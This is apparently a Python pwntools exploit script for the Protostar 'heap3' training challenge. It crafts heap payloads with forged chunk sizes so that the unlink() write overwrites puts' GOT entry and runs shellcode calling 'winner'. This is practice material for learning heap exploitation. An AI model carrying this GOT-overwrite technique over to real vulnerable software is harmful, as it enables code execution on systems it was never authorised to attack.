#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/heap3'
sh.download(binarypath)
elf=ELF('./heap3')
winner=elf.symbols['winner']
puts=elf.got['puts']
heap_addr=0x804c010#addr of code
code=''
code+=asm('mov eax,'+hex(winner))#mov eax,winner
code+=asm('call eax')# call eax i.e. call winner
payload1='A'*8+code
payload2='A'*(4*9)+"\x65"
# 0xffffffc is used to create a cummulative -4 to get
# 2 blocks which are not in use to trigger unlink()
payload3='A'*(4*23)+p32(0xfffffffc)*2+p32(puts-12)+p32(heap_addr)
p=sh.run([binarypath,payload1,payload2,payload3])

print p.recvall()

os.system('rm heap3')